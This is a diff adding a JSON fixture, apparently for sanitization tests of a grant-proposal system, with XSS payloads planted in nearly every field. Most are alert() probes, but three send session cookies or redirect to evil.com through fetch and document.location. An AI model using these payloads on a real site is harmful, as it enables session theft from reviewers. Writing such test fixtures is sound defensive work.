@@ -1,0 +1,22 @@
+{
+  "title": "<script>alert('xss')</script> Malicious Proposal Title",
+  "description": "This is a seemingly normal proposal description that contains hidden XSS payloads throughout. The attacker embeds <img onerror=\"alert(1)\" src=x> tags within otherwise legitimate-looking text to bypass naive sanitization filters. Additionally, event handlers like <div onmouseover=\"fetch('https://evil.com/steal?cookie='+document.cookie)\">hover me</div> are placed strategically to exfiltrate session data from reviewers.",
+  "problemStatement": "<svg onload=\"alert('xss-problem')\">The problem is that security is often an afterthought in grant evaluation systems.</svg>",
+  "proposedSolution": "We propose a solution that <iframe src=\"javascript:alert('xss-solution')\"></iframe> addresses security concerns by implementing proper input validation and output encoding across all user-facing surfaces.",
+  "teamMembers": [
+    { "name": "<script>document.location='https://evil.com/steal'</script>", "role": "Lead Developer" },
+    { "name": "Normal Person", "role": "<img src=x onerror=\"alert('role-xss')\">" }
+  ],
+  "budgetAmount": 50000,
+  "budgetBreakdown": "Development <script>alert('budget-xss')</script>: $30,000. Testing and audit: $15,000. Contingency: $5,000.",
+  "timeline": "Week 1-3: Development <img src=x onerror=alert('timeline')>. Week 4: Testing. Week 5: Deployment.",
+  "category": "infrastructure",
+  "residencyDuration": "5-weeks",
+  "demoDayDeliverable": "A working prototype <script>fetch('https://evil.com/exfil?data='+document.cookie)</script> with full test coverage.",
+  "communityContribution": "Open-source all code <a href=\"javascript:alert('link-xss')\">click here</a> and host workshops for the community.",
+  "priorIpeParticipation": false,
+  "links": [
+    "https://github.com/legit-looking/repo",
+    "javascript:alert('link-vector')"
+  ]
+}
